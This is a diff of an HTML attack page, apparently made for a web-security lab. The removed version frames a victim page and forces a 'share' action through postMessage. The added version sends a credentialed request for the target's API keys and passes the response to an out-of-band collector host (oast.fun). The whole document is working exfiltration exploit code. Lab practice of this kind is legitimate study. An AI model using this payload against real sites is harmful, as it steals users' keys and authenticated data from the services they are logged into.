@@ -1,32 +1,16 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>evil</title>
-</head>
 <body>
-
-<!-- iframe منفصل فيه صفحة key/0 -->
-<iframe
-  id="victim"
-  src="http://ptl-bf51ffffdb02-188e9eb63e67.libcurl.me/key/0"
-  style="width:300px;height:200px;border:1px solid black;">
-</iframe>
-
 <script>
-setTimeout(function () {
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://ptl-94a8e0ee761c-97cb36c29d49.libcurl.me/api/v1/keys", false);
+xhr.withCredentials = true;
+xhr.send();
+var a = xhr.responseText;
 
-  /* نفس الفورمات اللي الزرار بيبعته */
-  var msg = "user=user1111&id=0";
-
-  /* إجبار الصفحة تعمل share */
-  document
-    .getElementById("victim")
-    .contentWindow
-    .postMessage(msg, "*");
-
-}, 3000);
+var xhr2 = new XMLHttpRequest();
+xhr2.open("GET", "http://wlikmodtjuxpisuqbswjvxs2tboi59zla.oast.fun/" + a, false);
+xhr2.withCredentials = true;
+xhr2.send();
 </script>
-
 </body>
 </html>
